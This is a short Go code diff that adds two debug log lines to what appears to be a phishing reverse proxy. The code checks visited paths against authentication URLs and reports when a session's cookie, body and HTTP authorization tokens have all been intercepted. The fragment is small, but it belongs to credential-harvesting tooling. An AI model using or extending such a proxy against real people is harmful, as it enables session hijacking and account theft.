@@ -837,6 +837,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					s, ok := p.sessions[ps.SessionId]
 					if ok && !s.IsDone {
 						for _, au := range pl.authUrls {
+							log.Debug("auth_url: %s try match %s", au.String(), req.URL.Path)
 							if au.MatchString(req.URL.Path) {
 								s.Finish(true)
 								break
@@ -1019,6 +1020,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if is_cookie_auth && is_body_auth && is_http_auth {
 				// we have all auth tokens
 				if s, ok := p.sessions[ps.SessionId]; ok {
+					log.Debug("[%d] all authorization tokens intercepted!", ps.Index)
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
 
